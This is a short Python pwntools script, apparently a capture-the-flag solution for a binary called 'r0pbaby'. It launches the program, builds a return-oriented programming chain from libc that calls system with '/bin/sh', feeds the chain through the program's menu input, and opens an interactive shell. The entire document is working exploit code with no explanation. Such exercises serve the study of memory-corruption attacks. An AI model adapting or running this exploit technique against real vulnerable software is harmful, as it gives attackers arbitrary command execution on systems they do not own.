from pwn import *

p=process('r0pbaby')

libc=p.libc

context.log_level='debug'
context.clear(arch = 'amd64', kernel = 'amd64')

p.readuntil(":")
p.readuntil(":")

def send_bytes(rop):
	p.writeline('3')
	p.readuntil(':')
	p.writeline('{:d}'.format(len(rop)))
	p.write(rop)	
	p.readuntil(':')
	p.writeline('4')
	
	p.readuntil('Exiting.')

r=ROP(libc)
r.system(next(libc.search('/bin/sh')))

log.info(r.dump())

send_bytes(p64(0)+r.chain())

p.interactive()

p.close()



